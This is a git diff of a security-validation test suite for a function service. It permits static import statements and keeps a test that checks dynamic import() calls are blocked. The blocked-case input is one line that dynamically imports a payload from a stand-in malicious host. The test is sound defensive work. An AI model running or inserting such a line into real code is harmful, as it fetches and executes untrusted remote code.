@@ -124,7 +124,15 @@ describe('FunctionService Security Validation (Public API)', () => {
       await expect(createTestFunction(code)).rejects.toThrow(GENERIC_ERROR);
     });
 
-    it('should block import keyword', async () => {
+    it('should allow static import statements', async () => {
+      const code = "import { createClient } from 'npm:@insforge/sdk'; return new Response('ok');";
+      mockClient.query.mockResolvedValueOnce({});
+      mockClient.query.mockResolvedValueOnce({});
+      mockClient.query.mockResolvedValueOnce({ rows: [{ id: '1' }] });
+      await expect(createTestFunction(code)).resolves.toBeDefined();
+    });
+
+    it('should block dynamic import() calls', async () => {
       const code = 'import("http://malicious.com/payload.js")';
       await expect(createTestFunction(code)).rejects.toThrow(GENERIC_ERROR);
     });
